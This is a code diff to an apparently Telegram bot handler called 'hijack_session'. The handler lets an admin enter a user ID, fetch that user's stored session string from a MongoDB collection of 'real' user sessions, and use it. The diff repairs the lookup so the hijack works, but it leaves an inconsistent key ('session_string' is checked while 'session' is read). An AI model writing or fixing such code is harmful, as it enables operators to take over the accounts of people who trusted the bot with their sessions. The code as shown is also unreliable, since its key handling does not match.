@@ -59,17 +59,19 @@ async def hijack_session(_, message):
 
     # Wait for admin to send user_id
     user_id_msg = await app.listen(admin_id, timeout=60)
+    
     if not user_id_msg.text.isdigit():
-        await message.reply("Invalid user ID. Operation cancelled.")
+        await message.reply("❌ Invalid user ID. Operation cancelled.")
         return
 
     user_id = int(user_id_msg.text)
 
-    # Check if user_id exists in MongoDB (user_real_session
-    user_session = await db["user_sessions_real"].find_one({"_id": user_id})
-    if not user_session or "session" not in user_session:
-        await message.reply("User not found in the database.")
+    # Check if user_id exists in MongoDB (user_sessions_real)
+    user_session = await user_sessions_real.find_one({"user_id": user_id})  # ✅ Fixed query
+    if not user_session or "session_string" not in user_session:  # ✅ Corrected session key check
+        await message.reply("❌ User not found in the database.")
         return
+
 
     session_string = user_session["session"]
 
